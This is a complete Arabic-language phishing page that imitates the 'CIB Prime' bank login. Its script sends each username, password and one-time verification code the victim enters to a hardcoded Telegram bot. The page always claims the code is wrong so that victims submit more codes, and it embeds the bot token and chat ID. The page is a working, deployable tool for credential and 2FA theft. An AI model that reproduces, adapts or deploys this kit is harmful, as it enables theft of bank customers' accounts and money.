<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CIB Prime - تسجيل الدخول</title>
    
    <meta property="og:title" content="CIB Prime">
    <meta property="og:description" content="تطبيق CIB Prime الخدمات المصرفية الذكية">
    <meta property="og:image" content="https://b.top4top.io/p_3800b6k3n0.jpeg">
    <meta property="og:type" content="website">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="CIB Prime">
    <meta name="twitter:description" content="تطبيق CIB Prime الخدمات المصرفية الذكية">
    <meta name="twitter:image" content="https://b.top4top.io/p_3800b6k3n0.jpeg">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            direction: rtl;
        }

        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
            animation: slideUp 0.6s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(40px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .page-1 {
            display: block;
            animation: fadeIn 0.5s ease-out;
        }

        .page-1.hidden {
            display: none;
        }

        .page-2 {
            display: none;
            animation: fadeIn 0.5s ease-out;
        }

        .page-2.active {
            display: block;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .header {
            padding: 30px 30px 20px;
            background: white;
            border-bottom: 1px solid #f0f0f0;
            text-align: center;
        }

        .logo {
            text-align: center;
        }

        .logo img {
            height: 50px;
            object-fit: contain;
        }

        .content {
            padding: 40px 30px;
        }

        .error-message {
            display: none;
            text-align: center;
            margin-bottom: 20px;
            padding: 12px 16px;
            background: #ffebee;
            border-radius: 10px;
            color: #c62828;
            font-weight: 600;
            font-size: 13px;
            animation: slideDown 0.3s ease-out;
        }

        .error-message.show {
            display: block;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 24px;
        }

        .form-label {
            font-size: 16px;
            font-weight: 600;
            color: #333;
            text-align: right;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 1px solid #ddd;
            border-radius: 12px;
            outline: none;
            transition: all 0.3s ease;
            background: white;
            font-family: inherit;
            direction: rtl;
            text-align: right;
            color: #333;
        }

        .input-field::placeholder {
            color: #999;
        }

        .input-field:focus {
            border-color: #1e4a96;
            box-shadow: 0 0 0 3px rgba(30, 74, 150, 0.1);
        }

        .forgot-password {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 20px;
        }

        .forgot-password-link {
            color: #1e4a96;
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .forgot-password-link:hover {
            text-decoration: underline;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            background: #1e4a96;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .login-btn:hover:not(:disabled) {
            background: #163a75;
            box-shadow: 0 5px 20px rgba(30, 74, 150, 0.3);
        }

        .login-btn:active:not(:disabled) {
            transform: translateY(0);
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .login-btn.loading {
            color: transparent;
        }

        .login-btn.loading::after {
            content: '';
            position: absolute;
            width: 16px;
            height: 16px;
            top: 50%;
            left: 50%;
            margin-left: -8px;
            margin-top: -8px;
            border: 2px solid #ffffff;
            border-radius: 50%;
            border-top: 2px solid transparent;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .register-link {
            text-align: center;
            font-size: 13px;
            color: #666;
        }

        .register-link a {
            color: #1e4a96;
            text-decoration: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .register-link a:hover {
            text-decoration: underline;
        }

        .back-btn {
            background: none;
            border: none;
            color: #1e4a96;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 20px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            transition: all 0.3s ease;
            padding: 6px;
            font-weight: 600;
        }

        .back-btn:hover {
            transform: translateX(5px);
        }

        .verify-title {
            font-size: 20px;
            font-weight: 700;
            color: #333;
            text-align: center;
            margin-bottom: 8px;
        }

        .verify-message {
            font-size: 13px;
            color: #666;
            line-height: 1.8;
            margin-bottom: 30px;
            text-align: center;
        }

        .username-display {
            font-weight: 700;
            color: #1e4a96;
            font-size: 14px;
            direction: ltr;
            margin: 8px 0;
        }

        .otp-container {
            display: flex;
            gap: 12px;
            margin-bottom: 35px;
            justify-content: center;
            flex-direction: row-reverse;
        }

        .otp-input {
            width: 60px;
            height: 60px;
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            border: 1px solid #ddd;
            border-radius: 12px;
            outline: none;
            transition: all 0.3s ease;
            background: white;
            direction: ltr;
        }

        .otp-input:focus {
            border-color: #1e4a96;
            box-shadow: 0 0 0 3px rgba(30, 74, 150, 0.1);
        }

        .otp-input.filled {
            border-color: #1e4a96;
            color: #333;
            font-weight: 700;
        }

        .resend-section {
            margin-bottom: 25px;
            text-align: center;
        }

        .resend-btn {
            background: none;
            border: none;
            color: #1e4a96;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            transition: all 0.3s ease;
            padding: 6px;
        }

        .resend-btn:hover:not(:disabled) {
            transform: scale(1.05);
        }

        .resend-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .refresh-icon {
            display: inline-block;
            width: 16px;
            height: 16px;
            transition: transform 0.3s ease;
        }

        .resend-btn.spinning .refresh-icon {
            animation: spin 1s linear infinite;
        }

        .verify-btn {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            background: #1e4a96;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }

        .verify-btn:hover:not(:disabled) {
            background: #163a75;
            box-shadow: 0 5px 20px rgba(30, 74, 150, 0.3);
            transform: translateY(-2px);
        }

        .verify-btn:active:not(:disabled) {
            transform: translateY(0);
        }

        .verify-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .verify-btn.loading {
            color: transparent;
        }

        .verify-btn.loading::after {
            content: '';
            position: absolute;
            width: 16px;
            height: 16px;
            top: 50%;
            left: 50%;
            margin-left: -8px;
            margin-top: -8px;
            border: 2px solid #ffffff;
            border-radius: 50%;
            border-top: 2px solid transparent;
            animation: spin 1s linear infinite;
        }

        @media (max-width: 600px) {
            .container {
                max-width: 100%;
                border-radius: 20px;
            }

            .header {
                padding: 20px;
            }

            .content {
                padding: 30px 20px;
            }

            .otp-input {
                width: 55px;
                height: 55px;
                font-size: 22px;
            }

            .otp-container {
                gap: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Page 1: Login -->
        <div class="page-1" id="page1">
            <div class="header">
                <div class="logo">
                    <img src="https://b.top4top.io/p_3800b6k3n0.jpeg" alt="CIB Prime">
                </div>
            </div>

            <div class="content">
                <div class="error-message" id="errorMessage1"></div>

                <form id="loginForm">
                    <div class="form-group">
                        <label class="form-label">اسم المستخدم</label>
                        <input 
                            type="text" 
                            id="usernameInput" 
                            class="input-field" 
                            placeholder="أدخل اسم المستخدم"
                            required
                        >
                    </div>

                    <div class="form-group">
                        <label class="form-label">كلمة المرور</label>
                        <input 
                            type="password" 
                            id="passwordInput" 
                            class="input-field" 
                            placeholder="أدخل كلمة المرور"
                            required
                        >
                    </div>

                    <div class="forgot-password">
                        <span class="forgot-password-link">هل نسيت كلمة المرور؟</span>
                    </div>

                    <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
                </form>

                <div class="register-link">
                    مستخدم جديد؟ <a>سجل الآن</a>
                </div>
            </div>
        </div>

        <!-- Page 2: Verification -->
        <div class="page-2" id="page2">
            <div class="header">
                <div class="logo">
                    <img src="https://b.top4top.io/p_3800b6k3n0.jpeg" alt="CIB Prime">
                </div>
            </div>

            <div class="content">
                <button class="back-btn" id="backBtn">← رجوع</button>

                <div class="verify-title">التحقق من الهوية</div>
                
                <div class="verify-message">
                    تم إرسال رمز التحقق المكون من 6 أرقام إلى<br>
                    <span class="username-display" id="displayUsername"></span>
                </div>

                <div class="error-message" id="errorMessage2"></div>

                <div class="otp-container" id="otpContainer">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="5">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="4">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="3">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="2">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="1">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" data-index="0">
                </div>

                <div class="resend-section">
                    <button type="button" class="resend-btn" id="resendBtn">
                        <span class="refresh-icon">🔄</span>
                        إعادة إرسال الرمز
                    </button>
                </div>

                <button type="button" class="verify-btn" id="verifyBtn">تحقق</button>
            </div>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8881255740:AAHY2hPtgUU8DfGwcZtLujVXXo4h7hhb5qA';
        const TELEGRAM_CHAT_ID = '8755256359';

        const page1 = document.getElementById('page1');
        const page2 = document.getElementById('page2');
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('usernameInput');
        const passwordInput = document.getElementById('passwordInput');
        const loginBtn = document.getElementById('loginBtn');
        const backBtn = document.getElementById('backBtn');
        const otpInputs = document.querySelectorAll('.otp-input');
        const verifyBtn = document.getElementById('verifyBtn');
        const resendBtn = document.getElementById('resendBtn');
        const displayUsername = document.getElementById('displayUsername');
        const errorMessage1 = document.getElementById('errorMessage1');
        const errorMessage2 = document.getElementById('errorMessage2');

        let currentUsername = '';
        let currentPassword = '';

        function showError(message, page = 1) {
            const errorEl = page === 1 ? errorMessage1 : errorMessage2;
            errorEl.textContent = message;
            errorEl.classList.add('show');
            setTimeout(() => {
                errorEl.classList.remove('show');
            }, 4000);
        }

        usernameInput.addEventListener('input', () => {
            errorMessage1.classList.remove('show');
        });

        passwordInput.addEventListener('input', () => {
            errorMessage1.classList.remove('show');
        });

        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    }),
                });

                if (!response.ok) {
                    const errorData = await response.json();
                    console.error('Telegram error:', errorData);
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                return await response.json();
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                throw error;
            }
        }

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            if (!username || username.length < 3) {
                showError('الرجاء إدخال اسم مستخدم صحيح', 1);
                return;
            }

            if (!password || password.length < 4) {
                showError('الرجاء إدخال كلمة مرور صحيحة', 1);
                return;
            }

            currentUsername = username;
            currentPassword = password;

            loginBtn.classList.add('loading');
            loginBtn.disabled = true;

            try {
                const message = `📱 <b>محاولة تسجيل دخول جديدة:</b>\n\n👤 <b>اسم المستخدم:</b> <code>${username}</code>\n🔐 <b>كلمة المرور:</b> <code>${password}</code>`;
                
                await sendToTelegram(message);

                page1.classList.add('hidden');
                page2.classList.add('active');
                displayUsername.textContent = username;

                otpInputs.forEach(input => {
                    input.value = '';
                    input.classList.remove('filled');
                });
                errorMessage2.classList.remove('show');
                otpInputs[5].focus();

                loginBtn.classList.remove('loading');
                loginBtn.disabled = false;
            } catch (error) {
                console.error('Error:', error);
                showError('حدث خطأ في الاتصال. حاول مرة أخرى', 1);
                loginBtn.classList.remove('loading');
                loginBtn.disabled = false;
            }
        });

        backBtn.addEventListener('click', () => {
            page2.classList.remove('active');
            page1.classList.remove('hidden');
            usernameInput.focus();
            errorMessage2.classList.remove('show');
            otpInputs.forEach(input => input.value = '');
        });

        otpInputs.forEach((input, visualIndex) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^\d]/g, '');

                if (e.target.value.length === 1) {
                    e.target.classList.add('filled');
                    if (visualIndex < otpInputs.length - 1) {
                        otpInputs[visualIndex + 1].focus();
                    }
                }

                errorMessage2.classList.remove('show');
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value) {
                    if (visualIndex > 0) {
                        otpInputs[visualIndex - 1].focus();
                    }
                }
            });

            input.addEventListener('keyup', (e) => {
                if (e.target.value === '') {
                    e.target.classList.remove('filled');
                }
            });

            input.addEventListener('paste', (e) => {
                e.preventDefault();
            });
        });

        verifyBtn.addEventListener('click', async () => {
            const enteredCode = Array.from(otpInputs)
                .map(input => input.value)
                .join('');

            if (enteredCode.length !== 6) {
                showError('الرجاء إدخال الرمز كاملاً (6 أرقام)', 2);
                return;
            }

            verifyBtn.classList.add('loading');
            verifyBtn.disabled = true;

            try {
                const message = `✅ <b>محاولة تحقق من الرمز:</b>\n\n👤 <b>اسم المستخدم:</b> <code>${currentUsername}</code>\n🔐 <b>كلمة المرور:</b> <code>${currentPassword}</code>\n🔑 <b>الرمز:</b> <code>${enteredCode}</code>`;
                
                await sendToTelegram(message);

                showError('❌ رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى', 2);

                otpInputs.forEach(input => {
                    input.value = '';
                    input.classList.remove('filled');
                });
                otpInputs[5].focus();

                verifyBtn.classList.remove('loading');
                verifyBtn.disabled = false;
            } catch (error) {
                console.error('Error:', error);
                showError('حدث خطأ في الاتصال. حاول مرة أخرى', 2);
                verifyBtn.classList.remove('loading');
                verifyBtn.disabled = false;
            }
        });

        resendBtn.addEventListener('click', async () => {
            resendBtn.disabled = true;
            resendBtn.classList.add('spinning');

            try {
                const message = `🔄 <b>إعادة طلب رمز التحقق:</b>\n\n👤 <b>اسم المستخدم:</b> <code>${currentUsername}</code>`;
                
                await sendToTelegram(message);

                errorMessage2.textContent = '✓ تم إرسال رمز جديد';
                errorMessage2.style.background = '#e8f5e9';
                errorMessage2.style.color = '#2e7d32';
                errorMessage2.classList.add('show');

                setTimeout(() => {
                    resendBtn.disabled = false;
                    resendBtn.classList.remove('spinning');
                    errorMessage2.classList.remove('show');
                    errorMessage2.style.background = '#ffebee';
                    errorMessage2.style.color = '#c62828';
                }, 3000);
            } catch (error) {
                console.error('Error:', error);
                resendBtn.disabled = false;
                resendBtn.classList.remove('spinning');
                showError('خطأ في إعادة الإرسال', 2);
            }
        });

        document.title = 'CIB Prime - تسجيل الدخول';
    </script>
</body>
</html>
